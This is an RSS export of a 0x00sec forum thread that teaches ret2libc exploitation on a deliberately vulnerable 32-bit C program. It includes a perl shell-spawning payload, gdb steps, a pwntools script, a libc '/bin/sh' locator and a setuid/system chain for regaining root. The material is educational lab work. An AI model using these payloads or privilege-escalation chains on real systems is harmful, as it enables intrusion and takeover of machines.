<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Exploiting Techniques \000 - ret2libc</title>
    <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833</link>
    <description>So it&#39;s been a while since I last wrote an article and I think it&#39;s time for a new one.
Since the straight forward smash stacking has already been covered plenty, I decided to start this serie with ret2libc.

It is assumed that you already understand the normal exploiting techniques, so make sure you already understand the following topics:

* C Programming, pointers, functions etc
* ASM (x86 will be used in this article)
* How the stack works (ebp, esp, return adress, parameters, locals, etc) 
* How to do smashstacking
* Probably having done some RE might help.

## Why Ret2libc
Between hackers and security specialists there is an eternal clash of cleverness.
Some hacker finds a new technique to exploit a bug and so the security specialist comes up with a way to prevent that technique from working by introducing a new technique to prevent that specific attack.
One of these techniques was smash stacking, writing shellcode to a buffer, and overwriting the return adress in the stackframe to a pointer to that buffer to execute the shellcode.
So a couple of security specialists discussed the problem and come up with a solution:
**Non executable stack** is what they came up with.
What this means is pretty straight forward: The shellcode on the stack can no longer be executed, since the processor is not allowed to execute instructions placed on the stack.
This worked until some clever came up with a new technique: **ret2libc**

## How Ret2libc Works
The idea of Ret2libc is pretty simple: Why write a shellcode, when there is plenty of useful functions residing in the **C library** already? 
After all when we write a program we&#39;re mainly using the libc&#39;s functions anyway.

So let&#39;s look at how a function works in C.
x86&#39;s call instruction actually does two things:

1. Push eip on stack
2. Jump to the function adress

before this some parameters might be pushed on the stack, after that some local variables might assigned on the stack.
But what matters is the push eip and the jump.

So what would happen if we return into a new function?

the function would assume a return adress was pushed on the stack and that above that return adress (higher adress) would be the arguments.

So what this means is that we manage to overwrite the return adress of a vulnerable function with the return adress of a function somewhere in memory we would like to execute we now know where it expects it&#39;s arguments.
But that would mean we can call a function and fabricate the arguments as well!
If this might sound vague don&#39;t worry we&#39;ll see what it means with an example.

## Exploiting a Very Vulnerable Program with Ret2libc
So let&#39;s look at some really, really vulnerable code (seriously don&#39;t ever write stuff like this)

```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[])
{
    char buf[256];

    gets(buf);
    printf(buf);

    return 0;
}
```
This program is not only vulnerable to ret2libc, but also to format string attacks, but that&#39;s not of importance here (though it can make things easier).

So now compile it with the following flags:
`gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -o ret2libc ret2libc.c`

Also make sure to turn off ALSR : 
`sudo su - root`
`echo 0 &gt; /proc/sys/kernel/randomize_va_space`
`exit`

So now let&#39;s exploit this program to spawn a shell.
The function we&#39;ll be using is in libc and you might have used it once or twice: `system()`
System is nice, because it takes only one argument, a string being the command you which to execute (for more info `man 3 system` )

What interests us are 3 things: 

1. The length of the buffer (and from where the return adress begins).
2. The adress of system in libc.
3. In this case, the adress of the start of the buffer

Since we&#39;re exploiting gets here, we don&#39;t have to worry about nullbytes (newlines however are a problem, so keep that in mind if you ever mess around with `gets` ).

So to get the adress of system, we will be using `gdb`, for the length of the buffer we will just mess around a bit until we find it (use gdb or something like that) It&#39;s probably at 260 anyway and for the adress of the buffer we will be using `ltrace`.

***Getting the adress of system***
Open up `gdb` : 
`gdb ./ret2libc`
Withing gdb:
`break main`
`run`
`p system`  (make a note of the adress)
`q` (we&#39;re done here).

***Getting the buffersize***
do something like:
`perl -e &#39;print &quot;a&quot; x 260 . &quot;bbbb&quot;&#39; | ./ret2libc`
check in gdb, should be something like &#39;0x62626262, invalid instruction&#39;, else mess around the numbers of a&#39;s till you get that error.

***Getting the adress of the start of the buffer***
This one is really simple.
simply run:
`ltrace ./ret2libc`
in there you should see something like: 
`gets( some stuff ) = 0xffff3d28`
This is exactly what we need, because get&#39;s returns the argument passed to it if it succeeds, meaning we found the adress of the buffer (yay).

Now that we got all the ingredients, let&#39;s work on actually exploiting it.
We will be doing the following:
begin our vulnerable input with:
`&quot;/bin/sh\x00&quot;`
(this will be the argument passed to system (luckily we know it&#39;s adress, which happens to be the start of the buffer ^^).

then we need to fill until the return adress with whatever you like.
`&quot;a&quot; x 260` sounds perfect.

Now comes the return adress, this is what ret2libc makes ret2libc.
fill in the adress of `system` which you obtained earlier.
Let&#39;s assume it&#39;s `0xf7e503e0` so after the a&#39;s will come:
`&quot;\xe0\x03\xe5\xf7&quot;`
This will make the function return into the start of the function system.

**Ok now the tricky part comes**, remember how I was mumbling about the function expecting to have the return adress being pushed on the stack by the functon call? Well it didn&#39;t, since we *returned* into the function rather than *call* the function!

So our next 4 bytes will be either a valid return adress (perhaps another C library function ^^?), or some random garbage.
For the sake of simplicity I&#39;ve chosen for random garbage, meaning the program will segfault afterwards.

After the 4 bytes of garbage will come the parameter to function `system`.
In this case it&#39;s a string, which we found earlier!
so fill it in here (for me it was `0xffff3d28`) : 
`&quot;\x28\x3d\xff\xff&quot;`.

In total we should now have something like the following:
`perl -e &#39;print &quot;/bin/sh\x00&quot; . &quot;a&quot; x 260 . &quot;\xe0\x03\xe5\xf7&quot; . &quot;aaaa&quot; . &quot;\x28\xd3\xff\xff&quot;&#39;`

You can chose to output it to a file so you can `cat` it later and not make a mess from your terminal:
`perl -e &#39;print &quot;/bin/sh\x00&quot; . &quot;a&quot; x 260 . &quot;\xe0\x03\xe5\xf7&quot; . &quot;aaaa&quot; . &quot;\x28\xd3\xff\xff&quot;&#39; &gt; hakz`

Now let&#39;s try it ( with a nice trick to prevent the program from immediatly closing )
`(cat hakz; echo &quot;&quot;; cat) | ./ret2libc`


Voila! A working exploit.

## Conclusion
Well as you can see we&#39;ve now exploited a trivial program. Ofcourse you&#39;d probably never encounter a program compiled with these flags, but that was not the point here.
The reason this won&#39;t work nowadays are two techniques used in almost every compiler / OS nowadays:

1. Canaries (overwriting a `canary value` on the stack will terminate the program).
2. ALSR (The adress of libc functions will be different each time you run the program).

This was a very basic introduction to ret2libc, please tell me how you liked it and feel free to ask questions!

~ IoTh1nKN0t

EDIT:

[quote=&quot;_py, post:9, topic:1833, full:true&quot;]
Here&#39;s the basic idea (keep in mind this will work on 32-bit binaries):
```
                           Stack
                  +----------------------+
                  |       &quot;/bin/sh&quot;      |
                  +----------------------+
                  |   ret_after_system   |
                  +----------------------+
                  |     system_addr      |   &lt;-- ret
                  +----------------------+
                  |         ....         |
                  |         ....         |
                  | &quot;AAAAAAAAAAAAAAAAAA&quot; |
                  |         ....         |
                  |         ....         |
                  +----------------------+
```
{{NOTE THAT THE &quot;/bin/sh&quot; THERE IS A POINTER TO A STRING, NOT THE STRING ITSELF}}
It&#39;s the same as a buffer/stack overflow but with a twist. Since you can&#39;t return to the stack because it&#39;s not executable, you have to return somewhere else. Libc in that case could be pretty handy. 

@IoTh1nkN0t wanted to call system(). So all he had to do is &quot;simulate&quot; the function calling convention behaviour and jump to system()&#39;s code. Because the binary is 32-bit the function prologue in our case would be the following:


Push the return address on the stack.
Push the function&#39;s arguments.
Jump to system()&#39;s code.


When we have a case of a classic stack overflow, you overflow the stack and overwrite the pushed return address with the one of your shellcode&#39;s. Once gets() is done it&#39;ll jump to wherever the pushed return address is pointing to. But, there is no shellcode this time, there is system(). And in order to call system() you have to follow the above convention in order to look legit.

By the way, now that I look at @IoTh1nkN0t&#39;s perl command, I think the order should be different(?). I might be wrong though.
{{FIXED THAT ^^}}
[/quote]</description>
    
    <lastBuildDate>Tue, 11 Dec 2018 14:08:21 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[guly]]></dc:creator>
        <description><![CDATA[
            <p>hi there, a quick note about the use of environment variables and setuid() call on 32bit app/OS.<br>
we should already know that bash drop privs if not invoked with -p, but i also found that on most of my linuxes i loose suid privs when calling libc system().</p>
<p>let’s split this post in two part, the first task is to execute a path from env while the second task is to get back uid(0).</p>
<p>sometimes you don’t want, or can’t, spawn a shell but prefer to run another program or script, let’s call it /tmp/runme<br>
libc gadgets’ are endless, but i bet you won’t find /tmp/runme anywhere, and here we can use the good ol’ environment to store the string.</p>
<p>what we do is</p>
<blockquote>
<p>export RUNME=/tmp/runme</p>
</blockquote>
<p>if you google, you will surely found other example with more leading slashes because it can help to avoid wrong address, but we don’t really need it</p>
<p>now using any getenv like:</p>
<blockquote>
<p><span class="hashtag">#include</span> &lt;stdio.h&gt;<br>
<span class="hashtag">#include</span> &lt;stdlib.h&gt;<br>
<span class="hashtag">#include</span> &lt;string.h&gt;</p>
<p>int main(int argc, char *argv[]) {<br>
if(argc &lt; 3) {<br>
printf(“Usage: %s &lt;environ_var&gt; &lt;target_program&gt;\n”, argv[0]);<br>
exit(-1);<br>
}</p>
<p>char *addr_ptr;<br>
addr_ptr = getenv(argv[1]);<br>
addr_ptr+= getenv(strlen(argv[0]) - strlen(argv[2]))*2;</p>
<p>if(addr_ptr == NULL) {<br>
printf(“Environmental variable %s does not exist!\n”, argv[1]);<br>
exit(-1);<br>
}</p>
<p>printf("%s is stored at address %p\n", argv[1], addr_ptr);<br>
return(0);<br>
}</p>
</blockquote>
<p>we should find the address of our env var in memory:</p>
<blockquote>
<p>$ ./getenv RUNME stack6<br>
RUNME will be at 0xffffdf20<br>
also gdb can be used to address the same job using something like x/10s *((char **)environ), but gdb adds his own variable and the offset is slightly different.<br>
kept note that getenv finds RUNME at 0xbffff736, we place this address in runme var to get a mnemonic value.</p>
</blockquote>
<p>we now build our payload like:</p>
<blockquote>
<p>p = ‘A’*50 # arbitrary offset to achieve a stack overflow<br>
p+= p32(system)<br>
p+= p32(exit) # we like to keep it as clean as possible<br>
p+= p32(runme)</p>
</blockquote>
<p>and we will see your /tmp/runme executed.<br>
as i said before, i got stuck as uid(1000) too many times recently and i wanted to get back my beloved uid(0).</p>
<p>we can see lot of examples online about shellcodes that setuid/setruid but i started this with libc in mind and i wanted to finish in libc, so i used setuid().</p>
<p>and here is the second part, where we take our basic ret2libc and get it somewhere close to ROP to keep our privs.<br>
we indeed will use a pop ret instruction, pop ebp in this example to feed the call.<br>
we should be able to find setuid() call address in libc like we did for system() and exit() call, we just have to build our chain like this:</p>
<blockquote>
<p>p = ‘A’*50 # arbitrary offset to achieve a stack overflow<br>
p+= p32(setuid)<br>
p+= p32(popret) # pop ebp; ret<br>
p+= “\x00\x00\x00\x00”<br>
p+= p32(system)<br>
p+= p32(exit) # we like to keep it as clean as possible<br>
p+= p32(runme)</p>
</blockquote>
<p>and we’re now uid(0) again</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/31">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/31</link>
        <pubDate>Tue, 11 Dec 2018 14:08:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-31</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/30">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/30</link>
        <pubDate>Tue, 11 Dec 2018 13:34:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-30</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/29">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/29</link>
        <pubDate>Fri, 22 Dec 2017 00:57:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-29</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/28">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/28</link>
        <pubDate>Fri, 22 Dec 2017 00:43:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-28</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/27">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/27</link>
        <pubDate>Tue, 12 Dec 2017 09:19:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-27</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/_py">@_py</a>,</p>
<p>Just for anyone that is following the thread.</p>
<p>There is one single <code>"/bin/sh"</code> on my <code>libc</code>, otherwise, <code>strings</code> should had shown all of them. What you said is perfectly fine and my system is OK ;). It was may bad that I assume you were using the output of <code>ldd</code> as <code>libc_base</code> (that is what didn’t work for me) but you clearly said to use <code>gdb</code> and <code>vmmap</code>. A sentence that, for some reason, I filtered out.</p>
<p>I did the check and the offset produced in both cases is the same, however I have to admit that my little tool is a bit ad-hoc and probably won’t work for the general case.</p>
<p>Thanks for the clarification <a class="mention" href="https://0x00sec.org/u/_py">@_py</a></p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/26">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/26</link>
        <pubDate>Mon, 11 Dec 2017 20:45:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-26</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Either something is up with your system, or what’s more likely is that there is more than one occurrence of <code>/bin/sh</code> and strings outputs the latter offset for some weird reason (?).</p>
<p>PoC (x86_64 but doesn’t matter):</p>
<pre><code class="lang-makefile">&gt;&gt; strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
18cd17 /bin/sh

gef➤ vmmap libc
Start              End                Offset             Perm Path
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
gef➤ x/s 0x00007ffff7a0d000 + 0x18cd17
0x7ffff7b99d17:	"/bin/sh"

</code></pre>
<p>Anyway the strings issue can be discussed on IRC. Unless <a class="mention" href="https://0x00sec.org/u/whitecollar">@WhiteCollar</a> has further questions this thread will close soon.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/25">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/25</link>
        <pubDate>Mon, 11 Dec 2017 19:18:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-25</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>Slightly off-topic. But couldn’t resist <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<aside class="quote no-group" data-username="0x00pf" data-post="23" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>So I wrote a small program to get the data I need for my current setup:</p>
</blockquote>
</aside>
<p>Remember kids: If something doesn’t work with the tools provided, built your own.</p>
<ul>
<li>keeps your scripting/programming  knowledge up2date</li>
<li>implants used knowledge even deeper</li>
<li>coolness factor+1</li>
</ul>
<p>Just fits perfectly after reading through <code>PoC||GTFO</code> right now and seeing the following all over it:</p>
<blockquote>
<p>Just built your own god damn birdfeeder</p>
</blockquote>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/24">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/24</link>
        <pubDate>Mon, 11 Dec 2017 17:18:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-24</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/whitecollar">@WhiteCollar</a></p>
<p>The <code>system</code> function actually executes <code>/bin/sh -c command</code> (see the man page). An <code>sh: 1 something</code> means that you have successfully called <code>system</code> but with the wrong parameter. Whatever follows the <code>sh: 1 </code> is what you have tried to execute… that may be non-printable garbage.</p>
<p>Said that, at first glance, it looks like everything is in place except the pointer to <code>/bin/sh</code>. To get it you can either do as <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> did (add it into the stack as part of the string you are entering and then push the appropriate pointer in your payload) or use the trick that <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> indicated to get the string from libc at a fixed offset. I have to said that, just using <code>strings</code>, didn’t work for me. The offset I need is different of the one reported by <code>strings</code> (strings reports the file offset depending how your sections are mapped it may be different to the memory offset… that does not happen with code whose file offset is usually 0).</p>
<p>So I wrote a small program to get the data I need for my current setup:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// FIXME: Get size from the ELF 
//        Actually it should be fine to just search the .rodata section
#define SIZE  0x1fffff 

int main ()
{
  unsigned char *ptr, *ptr2;

  printf ("Libc base address: ");
  scanf ("%p", &amp;ptr);
  ptr2 = ptr;
  printf ("Looking for '/bin/sh'...");
  for (;ptr &lt; ptr2 + SIZE; ptr++)
    if (!strncmp (ptr, "/bin/sh\0", 7))
      {
	printf("Found at %p %x (%s)\n", ptr, ptr - ptr2, ptr);
	break; 
      }
}

</code></pre>
<p>For this post, that uses 32bits binaries I compiled with:</p>
<pre><code>gcc -m32 -o slibc slibc.c
</code></pre>
<p>The output from this tool on my system is:  ( <code>0xf7e0d000</code> comes from <code>ldd</code>)</p>
<pre><code>$ ./slibc
Libc base address: 0xf7e0d000
Looking for '/bin/sh'...Found at 0xf7f4ecec 141cec (/bin/sh)
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 162cec /bin/sh
</code></pre>
<p>Then using the address reported by the tool should work. At least, it worked for me.</p>
<p>Also note that you are running a PIE which may have a slightly different stack layout. In my tests I had to add 4 bytes to the ‘A’ strings to get the exploit working with the PIE version. You can disable pie with the flag ‘-no-pie’. Check with <code>file</code> to be sure you disabled it.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/23</link>
        <pubDate>Mon, 11 Dec 2017 17:03:29 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-23</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>I said <strong>libc base</strong>. You can’t just take whatever entry, you need to take the 1st one.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/22</link>
        <pubDate>Mon, 11 Dec 2017 12:55:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-22</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[WhiteCollar]]></dc:creator>
        <description><![CDATA[
            <p>When finding libc_base, I typed in vmmap libc into GDB after running the program and breaking on main and there were a few entries so i just took one of them and added the address to the offset of “/bin/sh” to obtain an address for “/bin/sh” in libc.</p>
<p>I’m still unable to get the exploit working.</p>
<p>After jumping into system():</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f65b9509eae36af14144a481abf845ec2462a305.png" width="690" height="388"></p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/21</link>
        <pubDate>Mon, 11 Dec 2017 12:34:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-21</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>You should pass the pointer to <code>/bin/sh</code>. How are you calculating sh’s address on the stack? If you’re using gdb to find that out, then that’s your mistake. The stack alignment/padding inside and outside of gdb is different (environment variables etc). That being said, you can either use pwntools as I said in order to attach to the process and calculate the address properly, or do it the <strong>proper</strong> way which is via libc, which is why <code>0xffffd144</code> didn’t look like libc to me. You can find <code>/bin/sh</code> in libc actually. Since ASLR is off, you can do the following to calculate its offset.</p>
<pre><code class="lang-makefile">&gt;&gt; ldd binary   
      ....                                       
     libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e0e000)
      ...
&gt;&gt; strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 18cd17 /bin/sh
</code></pre>
<p>Meaning, <code>/bin/sh</code> is at <strong>libc_base + 0x18cd17</strong> (on my system, that is). If you want to find libc’s base address, hop in gdb and type <code>vmmap libc</code>.</p>
<p>Here’s a quick n’ dirty pwntools script:</p>
<pre><code class="lang-python">from pwn import *

p = process('./binary')
pause()

# padding 
payload  = "..." 			
payload += p32(system)
payload += p32(0x41414141)
payload += p32(sh)

p.sendline(payload) 

p.interactive()
</code></pre>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/20</link>
        <pubDate>Mon, 11 Dec 2017 11:13:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-20</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[WhiteCollar]]></dc:creator>
        <description><![CDATA[
            <p>In regards to _py’s answer, shouldn’t system(0xffffd144) work then since 0xffffd144 is a pointer to “/bin/sh”?</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/19</link>
        <pubDate>Mon, 11 Dec 2017 11:12:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-19</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="WhiteCollar" data-post="17" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/w/b38774/40.png" class="avatar"> WhiteCollar:</div>
<blockquote>
<p>Wait do I pass a pointer to “/bin/sh” or the actual “/bin/sh”?</p>
</blockquote>
</aside>
<p>a pointer to where /bin/sh actually is. not the string itself.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/18</link>
        <pubDate>Mon, 11 Dec 2017 11:11:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-18</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[WhiteCollar]]></dc:creator>
        <description><![CDATA[
            <p>0xffffd144 is pointer to “/bin/sh” if you look at my second last image.<br>
0xf7e2e7f0 is the address of exit() which is the function I want to return to after system() but like you said its irrelevant.</p>
<p>Wait do I pass a pointer to “/bin/sh” or the actual “/bin/sh”?</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/17</link>
        <pubDate>Mon, 11 Dec 2017 11:09:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-17</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>First of all, it’s 2017, let me introduce you to <a href="https://github.com/Gallopsled/pwntools" rel="nofollow noopener">pwntools</a>! There is no need to hardcode your exploit in an one-liner.</p>
<p>I’m away currently, but from a really quick look it looks like once you overflow the buffer up until the return address, you’ve entered system’s address, which is correct and then you place sh’s address on top of it, which is wrong. Then you place <code>0xffffd144</code> (no idea what that address is, but it’s definitely not a <code>/bin/sh</code> address), which is where sh’s address <strong>should</strong> be placed.</p>
<p>Since you’re trying to call <code>system("/bin/sh")</code>, according to Linux’s 32-bit calling convention, you should have placed <code>system + retaddr + sh</code>. <code>retaddr</code> is irrelevant since system won’t return.  You are indeed calling <code>system</code>, but with the wrong argument, that’s why you’re getting an sh error. You’re calling <code>system(0xffffd144)</code>.</p>
<p>Make sure you scroll up in the comment section where I briefly describe how ret2libc works on x86 Linux.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/16</link>
        <pubDate>Mon, 11 Dec 2017 11:00:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-16</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[WhiteCollar]]></dc:creator>
        <description><![CDATA[
            <p>All right, I’ve taken a few screenshots because I think a picture tells a thousand words.</p>
<p>Binary Used (same as example):<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/f/fc6835123f3125db313f3734566b5aa004ba37db.png" width="690" height="388"></p>
<p>Breakpoints set in GDB:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/3/3401a5bf92ded0fc368245001662d5ccba3d9689.png" width="690" height="388"></p>
<p>Stack just before RET statement in main():<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/7/78f8ba00c965b52ea82457db09a66884844fc10f.png" width="690" height="388"></p>
<p>Contents of buffer:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/d/d6087eb10f95405f6642d59f9e1a4bd71792dd72.png" width="690" height="388"></p>
<p>Exploit used:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/8/8b041b132c945213342436854bc45ac40411c803.png" width="690" height="388"></p>
<p>Honestly man I’ve been trying to get a shell for days. I’ve gotten close with an error like sh: 1 error or something.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/15">Read full topic</a></p>
        ]]></description>
